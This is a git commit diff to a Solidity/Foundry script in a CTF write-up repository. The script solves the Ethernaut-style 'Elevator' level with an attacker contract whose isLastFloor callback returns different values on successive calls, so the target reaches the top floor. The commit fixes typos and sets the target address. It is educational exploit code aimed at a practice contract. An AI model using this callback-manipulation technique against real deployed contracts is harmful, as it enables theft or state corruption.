d41f148d9a27ac8151b4410ec6434a9f6e23e5cf
Clad Tsai <31056789+clad000@users.noreply.github.com>
2024-09-13 23:55:47 +0800

    Update Lev11Sol.s.sol

--- Writeup/Clad/script/Lev11Sol.s.sol
+++ Writeup/Clad/script/Lev11Sol.s.sol
@@ -5,19 +5,20 @@ import "../src/Elevator.sol";
 import "forge-std/Script.sol";
 import "forge-std/console.sol";
 
-// target 讓合約的電梯能到達頂樓
+// target 讓合約的電梯能到達頂樓 bool top = true
 // 此合約的風險 external call 錯誤運用
 // 呼叫同一個 external call 兩次卻能得到不同的回傳結果
 
 contract attackCon {
     bool myswitch;
-    Elevator public lev11Instance = Elevator();
+    Elevator public lev11Instance =
+        Elevator(0x249785dac78DB5559d8B982F413297195430223e);
 
     function startAttack() external {
-        lev11Instance.goTo(0);
+        lev11Instance.goTo(1);
     }
-_floor
-    function isLastFloor(unit _floor) external returns (bools) {
+
+    function isLastFloor(uint _floor) external returns (bool) {
         // 問題 _floor 在這邊是要？
         if (!myswitch) {
             myswitch = true;
@@ -28,12 +29,12 @@ _floor
     }
 }
 
-contract Lev10Sol is Script {
+contract Lev11Sol is Script {
     // Elevator public lev11Instance = Elevator(payable());
 
     function run() external {
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
-        lev11Instance startInstance = new lev11Instance();
+        attackCon startInstance = new attackCon();
         startInstance.startAttack();
         vm.stopBroadcast();
     }
